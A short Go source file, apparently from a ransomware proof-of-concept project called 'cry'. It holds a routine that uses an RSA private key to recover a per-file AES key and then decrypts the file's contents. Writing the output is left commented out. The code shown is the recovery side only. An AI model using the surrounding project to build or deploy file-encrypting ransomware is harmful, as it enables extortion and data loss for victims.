package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rsa"
	"io/ioutil"

	"github.com/redpois0n/cry/common"
)

func decrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	header := data[:common.KeySize+aes.BlockSize]
	header, err = rsa.DecryptPKCS1v15(nil, priv, header)

	if err != nil {
		panic(err)
	}

	key := header[:common.KeySize]
	iv := header[common.KeySize : common.KeySize+aes.BlockSize]

	data = data[common.KeySize+aes.BlockSize:]

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBDecrypter(block, iv)
	cipher.XORKeyStream(data, data)

	//ioutil.WriteFile(file, data, 0777) // TODO
}
